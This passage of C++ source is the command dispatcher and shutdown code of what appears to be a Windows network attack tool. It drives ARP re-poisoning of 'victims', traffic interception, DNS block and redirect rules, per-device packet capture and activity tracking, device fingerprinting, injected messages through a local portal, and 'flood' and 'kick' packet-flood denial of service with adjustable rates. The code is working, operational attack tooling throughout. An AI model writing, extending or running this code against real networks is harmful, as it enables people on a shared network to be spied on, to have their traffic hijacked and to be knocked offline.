        if (line == "3" || line == "m") {
            PF("  mode (1-6): ");
            std::string a; std::getline(std::cin, a);
            int m = atoi(trim(a).c_str());
            if (m < 1 || m > 6) { PF("[-] mode must be 1-6\n"); continue; }
            g_mode = m;
            PF("[+] mode %d\n", (int)g_mode);
            continue;
        }
        if (line.rfind("m ", 0) == 0) {
            int m = atoi(trim(line.substr(2)).c_str());
            if (m < 1 || m > 6) { PF("[-] mode must be 1-6\n"); continue; }
            g_mode = m;
            PF("[+] mode %d\n", (int)g_mode);
            continue;
        }
        if (line == "4" || line == "g" || line == "start") { startAttack(); continue; }
        if (line == "5" || line == "x" || line == "stop") {
            attackOn = false;
            g_dosRun = false;
            g_dosStandalone = false;
            g_quickStartPending = false;   // a pending Quick Start must not re-arm
            restoreAll();
            // always put forwarding back the way we found it, no matter which
            // mode was running (intercept enables it, block/dos disable it)
            restoreForwarding();
            continue;
        }
        if (line == "6" || line == "i" || line == "status") {
            PF("[+] mode=%d attack=%d fwd=%d portal=%d\n",
               (int)g_mode, attackOn.load(), g_forwardingEnabled.load(), g_portalActive.load());
            PF("    seen=%ld dns=%ld kills=%ld sent=%ld rep=%ld gwm=%ld\n",
               (long)g_seen, (long)g_dnsBlocked, (long)g_kills, (long)g_sent,
               (long)g_repoisons, (long)g_gwMacChanges);
            continue;
        }
        if (line == "7" || line == "f") {
            if (attackOn.load()) PF("[!] warning: toggling forwarding during an attack may disrupt it\n");
            bool on = !g_forwardingEnabled.load();
            if (enableForwarding(on)) PF("[+] forwarding %s\n", on ? "enabled" : "disabled");
            else PF("[-] failed\n");
            continue;
        }
        if (line == "8" || line == "h" || line == "help") { help(); continue; }
        if (line == "users") { cmdUsers(); continue; }
        if (line == "tracks") { cmdTracks(); continue; }
        if (line == "report") { cmdReport(); continue; }
        if (line == "top" || line.rfind("top ", 0) == 0) {
            int n = 10;
            if (line.size() > 4) n = atoi(trim(line.substr(4)).c_str());
            cmdTop(n);
            continue;
        }
        if (line.rfind("watch ", 0) == 0) { watchVictim(trim(line.substr(6))); continue; }
        if (line.rfind("showtrack ", 0) == 0) {
            std::istringstream ss(line.substr(10));
            std::string ip; int n = 30;
            ss >> ip;
            if (!(ss >> n) || n <= 0) n = 30;
            if (!ip.empty()) cmdShowTrack(ip, n);
            continue;
        }
        if (line.rfind("detail ", 0) == 0) {
            std::istringstream ss(line.substr(7));
            std::string ip; int n = 50;
            ss >> ip;
            if (!(ss >> n) || n <= 0) n = 50;
            if (!ip.empty()) cmdDetail(ip, n);
            continue;
        }
        if (line == "stats" || line.rfind("stats ", 0) == 0) {
            std::string ip = line.size() > 6 ? trim(line.substr(6)) : "";
            if (ip.empty()) { std::lock_guard<std::mutex> lk(g_focusMutex); ip = g_focusIp; }
            if (!ip.empty()) cmdStats(ip);
            else PF("[-] usage: stats <ip>\n");
            continue;
        }
        if (line == "bypass") { cmdBypass(); continue; }
        if (line == "fingerprint" || line.rfind("fingerprint ", 0) == 0) {
            std::string who = line.size() > 12 ? trim(line.substr(12)) : "*";
            std::vector<std::string> targets;
            if (!who.empty() && who != "*") {
                targets.push_back(who);          // allow any IP, victim or not
            } else {
                std::lock_guard<std::mutex> lk(g_vmutex);
                for (auto& v : g_victims) targets.push_back(v.ip);
            }
            if (targets.empty()) { PF("[-] no matching device\n"); continue; }
            PF("[*] fingerprinting %d device(s)...\n", (int)targets.size());
            for (auto& ip : targets) {
                g_fpActive++;
                std::thread(fingerprintVictim, ip).detach();
            }
            continue;
        }
        if (line.rfind("_focus ", 0) == 0) {
            std::string ip = trim(line.substr(7));
            if (ip == "-" || ip == "none") ip.clear();
            { std::lock_guard<std::mutex> lk(g_focusMutex); g_focusIp = ip; }
            PF("[+] focus %s\n", ip.empty() ? "(off)" : ip.c_str());
            continue;
        }
        if (line == "pcap" || line.rfind("pcap ", 0) == 0) {
            std::string arg = line.size() > 5 ? trim(line.substr(5)) : "";
            bool on = (arg == "on" || arg == "1");
            if (arg == "off" || arg == "0") on = false;
            else if (arg.empty()) on = !g_captureOn.load();
            g_captureOn = on;
            if (!on) closeAllCaptures();
            PF("[+] pcap %s\n", on ? "on" : "off");
            continue;
        }
        if (line == "perf") { cmdPerf(); continue; }
        if (line == "sweep" || line.rfind("sweep ", 0) == 0) {
            std::string arg = line.size() > 6 ? trim(line.substr(6)) : "";
            if (arg.empty()) {
                DWORD rep = g_sweepMs.load(); if (!rep) rep = ARP_REPOISON_MS;
                PF("[*] re-poison interval = %u ms\n", rep);
            } else {
                int ms = atoi(arg.c_str());
                if (ms < 500)   ms = 500;
                if (ms > 60000) ms = 60000;
                g_sweepMs = (DWORD)ms;
                PF("[+] re-poison interval = %d ms\n", ms);
            }
            continue;
        }
        if (line == "pcapmax" || line.rfind("pcapmax ", 0) == 0) {
            std::string arg = line.size() > 8 ? trim(line.substr(8)) : "";
            if (arg.empty()) {
                PF("[*] pcap cap = %llu MB per device\n", g_pcapMaxBytes.load() / (1024ull*1024ull));
            } else {
                int mb = atoi(arg.c_str());
                if (mb < 1)   mb = 1;
                if (mb > 4096) mb = 4096;
                g_pcapMaxBytes = (unsigned long long)mb * 1024ull * 1024ull;
                PF("[+] pcap cap = %d MB per device\n", mb);
            }
            continue;
        }
        if (line == "autonames" || line.rfind("autonames ", 0) == 0) {
            std::string arg = line.size() > 10 ? trim(line.substr(10)) : "";
            bool on = g_autoNames.load();
            if (arg == "on" || arg == "1") on = true;
            else if (arg == "off" || arg == "0") on = false;
            else on = !on;
            g_autoNames = on;
            PF("[+] background name retry %s\n", on ? "on" : "off");
            continue;
        }
        if (line.rfind("flood ", 0) == 0) {
            std::istringstream ss(line.substr(6));
            std::string ip; int pps = 0;
            ss >> ip >> pps;
            if (ip.empty()) { PF("usage: flood <ip> [pps]   (stop with unkick)\n"); continue; }
            if (pps >= 200 && pps <= 200000) g_dosRate = pps;
            PF("[+] flooding %s at %d pkt/s (stop with unkick)\n",
               ip.c_str(), g_dosRate.load());
            g_dosStandalone = true;
            startDos(ip);
            continue;
        }
        if (line.rfind("block ", 0) == 0) {
            std::istringstream ss(line.substr(6));
            std::string dom, who; ss >> dom;
            if (!(ss >> who)) who = "*";
            if (!dom.empty()) cmdBlock(dom, who);
            continue;
        }
        if (line.rfind("redirect ", 0) == 0) {
            std::istringstream ss(line.substr(9));
            std::string dom, ip, who; ss >> dom >> ip;
            if (!(ss >> who)) who = "*";
            if (!dom.empty() && !ip.empty()) cmdRedirect(dom, ip, who);
            continue;
        }
        if (line.rfind("unblock ", 0) == 0) { cmdUnblock(trim(line.substr(8))); continue; }
        if (line == "rules") { cmdRules(); continue; }
        if (line == "save") { saveRules(); continue; }
        if (line == "load") { loadRules(); continue; }
        if (line.rfind("kick ", 0) == 0) { startDos(trim(line.substr(5))); continue; }
        if (line == "unkick") { stopAllDos(); continue; }
        if (line == "dosrate") {
            PF("[*] dos rate = %d pkt/s per target\n", g_dosRate.load());
            continue;
        }
        if (line.rfind("dosrate ", 0) == 0) {
            int v = atoi(trim(line.substr(8)).c_str());
            if (v < 200) v = 200;
            if (v > 200000) v = 200000;
            g_dosRate = v;
            PF("[+] dos rate set to %d pkt/s per target\n", v);
            continue;
        }
        if (line == "restore") { restoreAll(); continue; }
        if (line.rfind("blockapp ", 0) == 0) {
            std::istringstream ss(line.substr(9));
            std::string app, who; ss >> app;
            if (!(ss >> who)) who = "*";
            if (!app.empty()) cmdBlockApp(app, who);
            continue;
        }
        if (line.rfind("unblockapp ", 0) == 0) { cmdUnblockApp(trim(line.substr(11))); continue; }
        if (line == "apps" || line.rfind("apps ", 0) == 0) {
            std::string who = "*";
            if (line.size() > 5) who = trim(line.substr(5));
            cmdApps(who);
            continue;
        }
        if (line == "appsigs") { cmdAppSigs(); continue; }
        if (line.rfind("msgall ", 0) == 0) {
            std::string t = trim(line.substr(7));
            if (!t.empty()) cmdMsg("*", t);
            continue;
        }
        if (line.rfind("msg ", 0) == 0) {
            std::istringstream ss(line.substr(4));
            std::string who; ss >> who;
            std::string text; std::getline(ss, text);
            if (!text.empty() && text[0] == ' ') text.erase(0, 1);
            if (!who.empty() && !text.empty()) cmdMsg(who, text);
            continue;
        }
        if (line.rfind("msgstop ", 0) == 0) { cmdMsgStop(trim(line.substr(8))); continue; }
        if (line == "msgstop") { cmdMsgStop("*"); continue; }
        if (line == "msgtest") {
            ensurePortal();
            if (!g_portalActive) {
                PF("[-] portal is not listening on :80\n");
                continue;
            }
            std::string r = httpGetSmall("127.0.0.1", 80, "/", 800);
            if (r.rfind("HTTP/1.1 200", 0) == 0 ||
                r.rfind("HTTP/1.0 200", 0) == 0)
                PF("[+] portal self-test OK (%zu bytes)\n", r.size());
            else
                PF("[-] portal self-test failed (%zu bytes)\n", r.size());
            continue;
        }

        // ---- GUI machine-readable ----
        if (line.rfind("_select ", 0) == 0) {
            std::string spec = line.substr(8);
            {
                std::lock_guard<std::mutex> lk(g_vmutex);
                for (auto& v : g_victims) v.sel = false;
                std::stringstream ss(spec);
                std::string tok;
                while (std::getline(ss, tok, ',')) {
                    std::string t = trim(tok);
                    if (t.empty()) continue;
                    for (auto& v : g_victims) if (v.ip == t) v.sel = true;
                }
            }
            int n = 0;
            {
                std::lock_guard<std::mutex> lk(g_vmutex);
                for (auto& v : g_victims) if (v.sel) n++;
            }
            PF("[+] %d target(s) selected\n", n);
            continue;
        }
        if (line == "_dump") {
            std::vector<Victim> vSnap;
            { std::lock_guard<std::mutex> lk(g_vmutex); vSnap = g_victims; }
            for (auto& v : vSnap)
                PF("VICTIM %s|%s|%s|%d|%s|%s|%s\n",
                   v.ip.c_str(), v.mac.c_str(), v.name.c_str(),
                   v.sel ? 1 : 0, v.ports.c_str(), v.osGuess.c_str(),
                   v.banner.c_str());
            int sel = 0;
            for (auto& v : vSnap) if (v.sel) sel++;
            int tracked = 0, rules_n = 0;
            { std::lock_guard<std::mutex> lk(g_activityMutex); tracked = (int)g_activity.size(); }
            { std::lock_guard<std::mutex> lk(g_dnsRuleMutex); rules_n = (int)g_dnsRules.size(); }
            std::string ifn = g_ifName;
            for (auto& ch : ifn) if (ch == ' ') ch = '_';
            std::string focus;
            { std::lock_guard<std::mutex> lk(g_focusMutex); focus = g_focusIp; }
            if (focus.empty()) focus = "-";
            PF("STATUS mode=%d attack=%d fwd=%d portal=%d seen=%ld arp=%ld dns=%ld kills=%ld sent=%ld tracked=%d rules=%d victims=%zu selected=%d scanning=%d cap=%d rep=%ld gwm=%ld focus=%s myip=%s gw=%s ifname=%s\n",
               (int)g_mode, attackOn ? 1 : 0,
               g_forwardingEnabled ? 1 : 0, g_portalActive ? 1 : 0,
               (long)g_seen, (long)g_arpReplies,
               (long)g_dnsBlocked, (long)g_kills, (long)g_sent,
               tracked, rules_n, vSnap.size(), sel, g_scanning.load() ? 1 : 0,
               g_captureOn.load() ? 1 : 0,
               (long)g_repoisons, (long)g_gwMacChanges, focus.c_str(),
               g_myIp.c_str(), g_gatewayIp.c_str(), ifn.c_str());
            {
                std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
                for (auto& r : g_dnsRules)
                    PF("RULE %s|%s|%s|%s\n",
                       r.pattern.c_str(), r.action.c_str(),
                       r.targetIp.c_str(), r.victim.c_str());
            }
            {
                std::string focusIp2 = (focus == "-") ? "" : focus;
                // name lookup from the vSnap copy we already hold (no nested
                // g_vmutex inside g_activityMutex - that lock order caused
                // stalls and is now eliminated)
                std::unordered_map<std::string, std::string> nameByIp;
                nameByIp.reserve(vSnap.size() * 2 + 8);
                for (auto& v : vSnap) if (!v.name.empty()) nameByIp[v.ip] = v.name;
                // copy the activity rows out under the lock, then print freely
                std::vector<Activity> acts;
                {
                    std::lock_guard<std::mutex> lk(g_activityMutex);
                    acts.reserve(g_activity.size());
                    for (auto& kv : g_activity) acts.push_back(kv.second);
                }
                for (auto& a : acts) {
                    DWORD age = a.lastSeen ? (GetTickCount() - a.lastSeen) / 1000 : 0;
                    auto nmIt = nameByIp.find(a.ip);
                    std::string nm = (nmIt == nameByIp.end()) ? "-" : nmIt->second;
                    PF("ACTIVITY %s|%s|%ld|%ld|%ld|%lu|%llu|%d|%llu\n",
                       a.ip.c_str(), nm.c_str(),
                       a.dnsCount, a.sniCount, a.httpCount, (unsigned long)age,
                       a.capBytes, a.capFull ? 1 : 0, a.events);
                    for (auto& app : a.apps)
                        PF("APP %s|%s|%d\n",
                           a.ip.c_str(), app.c_str(),
                           appBlocked(app, a.ip) ? 1 : 0);
                    if (!focusIp2.empty() && a.ip == focusIp2) {
                        for (auto& ev : a.recent)
                            PF("EVENT %s|%s\n", a.ip.c_str(), ev.c_str());
                        std::string pr;
                        for (auto& kv : a.proto) {
                            if (kv.second <= 0) continue;
                            if (!pr.empty()) pr += ',';
                            pr += kv.first + ":" + std::to_string(kv.second);
                        }
                        std::vector<std::pair<long, std::string>> pe;
                        pe.reserve(a.peers.size());
                        for (auto& kv : a.peers) pe.push_back(std::make_pair(kv.second, kv.first));
                        std::sort(pe.begin(), pe.end(),
                                  [](const std::pair<long, std::string>& x,
                                     const std::pair<long, std::string>& y) {
                                      return x.first > y.first;
                                  });
                        std::string ps;
                        for (size_t k = 0; k < pe.size() && k < 8; ++k) {
                            if (!ps.empty()) ps += ',';
                            ps += pe[k].second + ":" + std::to_string(pe[k].first);
                        }
                        std::string bs = bypassText(a);
                        PF("STATS %s|up=%llu|down=%llu|pktup=%llu|pktdown=%llu|proto=%s|peer=%s|bypass=%s\n",
                           a.ip.c_str(), a.byUp, a.byDown, a.pktUp, a.pktDown,
                           pr.c_str(), ps.c_str(), bs.c_str());
                    }
                }
            }
            PF("END\n");
            continue;
        }

        PF("[-] unknown: %s\n", line.c_str());
    }

    // ---- orderly shutdown ------------------------------------------------
    // Stop everything that can still touch the pcap handles *before* closing
    // them. Detached threads (sweeper / portal / DoS / scan) used to race with
    // pcap_close here and could crash on exit.
    attackOn = false;
    g_dosRun = false;
    g_sweeperRun = false;
    g_portalRun = false;
    g_running = false;
    g_quickStartPending = false;
    if (g_scanning) PF("[*] waiting for the scan to finish...\n");
    if (g_scanThread.joinable()) g_scanThread.join();
    if (g_sweeper.joinable())   g_sweeper.join();
    if (g_portal.joinable())    g_portal.join();
    for (int i = 0; i < 40 && g_dosActive.load() > 0; ++i) Sleep(50);
    // fingerprint threads are detached; give them a moment to finish so they
    // do not touch g_victims after shutdown
    for (int i = 0; i < 240 && g_fpActive.load() > 0; ++i) Sleep(50);
    Sleep(100);   // let any in-flight portal responder close its socket

    restoreAll();
    restoreForwarding();
    writeSummary();
    if (g_pcap) pcap_breakloop(g_pcap);
    if (monitor.joinable()) monitor.join();
    closeAllCaptures();
    closeTrackFiles();
    if (g_pcapSend && g_pcapSend != g_pcap) pcap_close(g_pcapSend);
    if (g_pcap) pcap_close(g_pcap);
    // deliberately no WSACleanup(): resolveNames() may still have a detached
    // getaddrinfo() running, and the OS reclaims Winsock at process exit
    return 0;
}
